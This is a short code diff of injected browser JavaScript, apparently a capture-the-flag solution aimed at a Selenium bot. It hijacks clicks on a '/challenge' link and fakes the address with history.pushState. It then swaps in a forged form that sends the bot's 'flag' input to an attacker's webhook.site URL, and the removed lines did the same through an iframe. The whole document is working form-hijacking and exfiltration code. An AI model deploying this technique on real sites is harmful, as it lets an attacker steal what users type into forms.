@@ -1,6 +1,6 @@
 
 (() => {
-    const WEBHOOK =
+    const webhook =
         'https://webhook.site/67909b69-79e2-46cd-8eb1-bf3cbfddac04';
 
     const link = document.querySelector('a[href="/challenge"]');
@@ -10,24 +10,18 @@
         e.preventDefault();
         e.stopImmediatePropagation();
 
-        // Display the real Challenge page in an iframe.
-        const frame = document.createElement('iframe');
-        frame.src = '/challenge';
-        frame.style = 'width:100%;height:800px;border:0';
-
-        document.querySelector('.content').replaceChildren(frame);
-
-        // Make Selenium see the expected URL.
+        // Keep our JavaScript context alive
         history.pushState({}, '', '/challenge');
 
-        frame.onload = () => {
-            const doc = frame.contentDocument;
-            const form = doc.querySelector('fieldset form');
-            if (!form) return;
-
-            // Redirect the actual form submission to our webhook.
-            form.action = WEBHOOK;
-            form.method = 'GET';
-        };
+        // Create the form expected by bot.py
+        document.querySelector('.content').innerHTML = `
+            <fieldset>
+                <form method="GET" action="${webhook}">
+                    <input name="flag" autocomplete="off">
+                    <input type="hidden" name="id" value="1">
+                    <input type="submit" value="Submit">
+                </form>
+            </fieldset>
+        `;
     }, true);
 })();
